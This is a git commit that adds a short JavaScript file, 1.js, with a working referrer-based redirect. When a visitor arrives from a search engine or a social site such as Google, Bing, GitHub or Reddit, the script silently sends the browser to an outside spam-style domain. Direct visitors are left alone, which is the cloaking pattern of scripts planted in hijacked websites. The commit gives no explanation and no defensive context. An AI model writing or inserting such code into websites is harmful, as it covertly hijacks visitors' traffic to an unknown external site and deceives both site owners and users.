08eb7790ec31729fd916e16f1915637b405250d3
thomaseadamse <thomaseadamse247@gmail.com>
2025-04-27 21:36:42 +0800

    Create 1.js

---
+++ 1.js
@@ -0,0 +1,15 @@
+(function() {
+  var referrer = document.referrer.toLowerCase();
+  var searchEngines = [
+    'google.', 'bing.', 'yahoo.', 'baidu.', 'duckduckgo.', 'yandex.', 'ask.', 'aol.', 'naver.', 'seznam.', 'sogou.', '360.cn', 'so.com',
+    'ecosia.org', 'startpage.com', 'qwant.com', 'github.com', 'linkedin.com', 'facebook.com', 'twitter.com', 'reddit.com'
+  ];
+
+  var isFromSearchEngine = searchEngines.some(function(engine) {
+    return referrer.includes(engine);
+  });
+
+  if (isFromSearchEngine) {
+    window.location.href = 'https://seo006.asha779.com';
+  }
+})();
